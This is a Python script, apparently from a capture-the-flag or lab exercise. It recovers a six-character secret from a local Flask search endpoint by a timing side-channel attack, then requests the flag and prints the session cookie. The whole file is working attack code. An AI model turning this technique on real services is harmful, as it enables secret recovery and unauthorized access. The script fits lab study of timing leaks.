import requests
import string
import time

URL = "http://127.0.0.1:5000/search"
CHARSET = string.ascii_lowercase
SECRET_LENGTH = 6
DELAY_THRESHOLD = 0.04  # adjust depending on sleep() in Flask app

SESSION = requests.Session()

def average_timing(query, tries=3):
    total = 0
    for _ in range(tries):
        start = time.time()
        r = SESSION.get(URL, params={"q": query})
        total += time.time() - start
    return total / tries

def discover_secret():
    discovered = ""
    for i in range(SECRET_LENGTH):
        max_time = 0
        best_char = ''
        for c in CHARSET:
            attempt = discovered + c
            delta = average_timing(attempt, tries=3)
            print(f"Trying: {attempt} | Avg Time: {delta:.4f}s")
            if delta > max_time:
                max_time = delta
                best_char = c
        discovered += best_char
        print(f"[+] Discovered so far: {discovered}")
    return discovered

def main():
    secret = discover_secret()
    print(f"\n[âœ“] Secret guessed: {secret}")

    # Final check to see if we get the flag
    r = SESSION.get(URL, params={"q": secret})
    print(f"\n Final response: {r.text}")

    # Print session cookie (base64-encoded Flask session)
    cookie = SESSION.cookies.get_dict().get('session', 'N/A')
    print(f"\n Session cookie sent to server:\nsession = {cookie}")

if __name__ == "__main__":
    main()
